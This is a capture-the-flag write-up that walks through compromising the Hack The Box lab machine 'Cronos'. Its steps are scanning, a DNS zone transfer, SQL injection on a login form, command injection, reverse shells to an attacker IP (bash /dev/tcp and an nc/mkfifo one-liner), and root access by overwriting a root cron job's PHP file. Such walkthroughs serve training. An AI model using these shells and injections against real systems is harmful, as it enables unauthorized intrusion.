![logo](/logo.png)

# [Cronos- BOX]  
Hi folks, today I am going to solve an Easy rated hack the box machine which was released on 12 Mar 2017 as the tenth machine on HTB,Cronos created by ch4p.So without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *http
  *HFS
  *HttpFileserver
  
###### code-nmap

```code
nmap -sV -sC -oA nmap/cronos 10.10.10.13
```

###### Output 

![](/Linux/Linux-Medium/Cronos/Screenshots/nmap.png)

```sh
nmap -sV -sC -oA nmap/cronos 10.10.10.13                                                                                          ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-11 19:23 EAT
Nmap scan report for 10.10.10.13
Host is up (0.62s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.95 seconds
```

looking at the results  we find out that there are 3 ports open and its a `Ubuntu`and its running an `Apache server`. 

port[22]-ssh
port[53]-dns
port[80]-  httpd 2.4.18

so when we go the browser at [http://10.10.10.13](http://10.10.10.13)

![](/Linux/Linux-Medium/Cronos/Screenshots/apache.png)

so looking at the page i think its a misconfigaration of the apache so lets foward this to burpsuite so that we can see the request and also change the hostname to `cronos.htb`

![](/Linux/Linux-Medium/Cronos/Screenshots/cronos.png)

when when we foward we get 

![](/Linux/Linux-Medium/Cronos/Screenshots/cronos1.png)

now am going to edit the host file so that i can include that `hostname` to my hosts

```sh
vi /etc/host
```

am going to run now `gobuster` so get some directories

```sh
gobuster dir -u http://cronos.htb -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -k 
```

![](/Linux/Linux-Medium/Cronos/Screenshots/gobuster.png)

now leaving that to run on the background we have to check the `dns` to see what we can find from the dns

```sh
nslookup
server 10.10.10.13
10.10.10.13
```

![](/Linux/Linux-Medium/Cronos/Screenshots/dns.png)

so next we chack zone trensfer to see if there are any transfers 

```sh
dig axfr @10.10.10.13 cronos.htb
```

![](/Linux/Linux-Medium/Cronos/Screenshots/zones.png)

from the zone transfer we see some few subdomains `admin.cronos.htb` ,`www.cronos.htb`, `ns1.cronos.htb` so lets add them to the host 

![](/Linux/Linux-Medium/Cronos/Screenshots/hosts.png)

so when we check we see that the ns1 has the apache page which is not configured and www is the default for the cronos so when we chack for admin we see that their is a login form 

![](/Linux/Linux-Medium/Cronos/Screenshots/admin.png)

but trying the default credential thus not yield anything. so lets go sqlmap this so see if it has SQl Injection. We creat a request using burpsuite and be able to copy it and using it to run sqlmap so that we do not have to feed it with many things

```code
POST / HTTP/1.1
Host: admin.cronos.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://admin.cronos.htb
Connection: keep-alive
Referer: http://admin.cronos.htb/
Cookie: PHPSESSID=hejcpne1ukqr67t9s128feagr5
Upgrade-Insecure-Requests: 1

username=admin&password=admin
```

```sh
sqlmap -r login.req
```

![](/Linux/Linux-Medium/Cronos/Screenshots/sqlmap.png)

we see something intresting 

![](/Linux/Linux-Medium/Cronos/Screenshots/redirect.png)

so lets test some basci SQL injection on the GUI. So by checking comman SQL payloads from [payloadAllThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md) we find a payload that works for us.

# Exploitation

![](/Linux/Linux-Medium/Cronos/Screenshots/payload.png)

After we use the credential above we are logged in

![](/Linux/Linux-Medium/Cronos/Screenshots/login.png)

so when we send and intercept this basic commands we find that their is a code execution

![](/Linux/Linux-Medium/Cronos/Screenshots/basiccode.png)

![](Linux/Linux-Medium/Cronos/Screenshots/burp.png)

so it looks like even in the command it has a command injection so we are going to look for a reverse shell

![](/Linux/Linux-Medium/Cronos/Screenshots/commandburp.png)

so from we can check [pentestmonkey](https://pentestmonkey.net/) for a good reverse shell

```sh
bash -i >& /dev/tcp/10.10.14.9/1337 0>&1
```

Then we start a `nc` listerner 

![](/Linux/Linux-Medium/Cronos/Screenshots/nclistner.png)

now trying this it did not work. so lets try something else.

```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.9 1337 >/tmp/f
```

![](/Linux/Linux-Medium/Cronos/Screenshots/bash.png)

so trying this it works 

![](/Linux/Linux-Medium/Cronos/Screenshots/shell.png)
## Takeover
 After geting the reverse shell we have to do some adjusment to our reverse shell to make it ready for using by doing a stty escalation to get an interactive shell:
 #### code-stty
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 [ctrl] + z
 stty raw -echo
 fg [Enter] two times
 ```
 
 Then setting the TERM so that you are able to clean the terminal:
 ```bash
 export TERM=xterm
```

user flag can be obtained

![](/Linux/Linux-Medium/Cronos/Screenshots/userflag.png)

# Privillage Escalation

Let us run an enumeration script known as [LinEnum](https://github.com/rebootuser/LinEnum). We can transfer the binary from our local host to the remote host using a Python server. The LinEnum result shows that there is a PHP file that is being executed as a cron job under user root .

uploading LinEnum from my box to the machine 

```sh
wget -r http://10.10.14.9:8000/LinEnum.sh
```

![](/Linux/Linux-Medium/Cronos/Screenshots/wget.png)

now we run the script

```sh
bash LinEnum.sh
```

![](/Linux/Linux-Medium/Cronos/Screenshots/LinEnum.png)

we see the cron job eing execute bty root 

![](/Linux/Linux-Medium/Cronos/Screenshots/executed.png)

Upon checking the permissions for this PHP file, we see that it is writable by the user www-data .

![](/Linux/Linux-Medium/Cronos/Screenshots/laravel.png)

Let us try to replace this file `/var/www/laravel/artisan` with a [PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Thus, when the `cron-job` runs this file as user root , we will obtain a reverse shell as user root . We can download the PHP reverse shell from above and edit the IP address and port parameters accordingly. Let's host it on our local machine using a Python server using the following command

we edit here 

![](/Linux/Linux-Medium/Cronos/Screenshots/reverseshell.png)

now we upload to the machine 

```sh
wget -r http://10.10.14.9:8000/php-reverse-shell.php
```

![](/Linux/Linux-Medium/Cronos/Screenshots/revershshell.png)

Then replace `/var/www/laravel/artisan` file with the `/tmp/php-reverse-shell.php`

```sh
mv php-reverse-shell.php /var/www/laravel/artisan
```

![](/Linux/Linux-Medium/Cronos/Screenshots/artisan.png)

Let's start a listener on the specified port in the reverse shell file on out local host and wait for the reverse hell from the box.

```sh
nc -lvnp 1338
```

After waiting for a minute, we receive a reverse shell as user root on the listening port.

![](/Linux/Linux-Medium/Cronos/Screenshots/rootuser.png)

we now use the above from take over to have a more interactive shell

![](/Linux/Linux-Medium/Cronos/Screenshots/rootflag.png)

	-------------------------END successful attack @lesley----------------------